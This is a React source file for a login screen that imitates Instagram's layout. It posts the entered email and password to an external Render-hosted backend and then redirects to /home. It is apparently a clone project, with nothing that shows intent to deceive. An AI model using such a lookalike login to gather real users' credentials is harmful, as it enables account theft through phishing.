import React,{useState} from 'react';
import img1 from "../img/mobile-app.png";
import imgA from '../img/app-store.png';
import imgG from '../img/google-play.png';
import imgI from '../img/logo.png';
import './Home.css';
import { FaFacebookSquare } from 'react-icons/fa';
import axios from 'axios';
import {  useNavigate } from 'react-router-dom';


const baseUrl = "https://insta-back-uvmi.onrender.com";
function Home() {

    const navigate = useNavigate();

    const [value, setValue] = useState({
        email: "",
        pass: "",
    });

    const submitNow = () => {
        if(value.email && value.pass){
        axios.post(`${baseUrl}/signin`, value)
        .then((response) => {
          console.log(response.data);
          navigate('/home')
        })
        .catch((error) => {
          console.log(error);
        });
        console.log(value);
    }else{
        alert("fill all details..")
    }
    }

    return (
        <div className='parent_home'>
            <div className="child_home">
                <div className="home_imge">
                    <img src={img1} alt="" />
                </div>
                <div className="home_data">
                    <div className="data_first">
                        <div className="logo">
                            <img src={imgI} alt="" />
                        </div>
                        <div className="input">
                            <input type="text"  placeholder='Phone number, username, or email' onChange={(e) => setValue((prev) => ({ ...prev, email: e.target.value }))}/>
                            <input type="password" placeholder='Password' onChange={(e) => setValue((prev) => ({ ...prev, pass: e.target.value }))} />
                            <button className='btn' onClick={submitNow}> 
                                Log in
                            </button>
                        </div>
                    </div>
                    <p className='or'></p>
                    <p className='or-1'>or</p>
                    <div className="data_sec">
                        
                    <h4> {<FaFacebookSquare className='newadd'/>} Log in with facebook</h4>
                        <p className='padd'>forget password</p>
                    </div>
                    <div className="data_third">
                        <h5>Don't have an Account ? <span> Sign up </span></h5>
                    </div>
                    <div className="data_four">
                        <img className='aapp' src={imgA} alt="" />
                        <img className='ggpp' src={imgG} alt="" />
                    </div>
                </div>
            </div>

        </div>
    )
}

export default Home
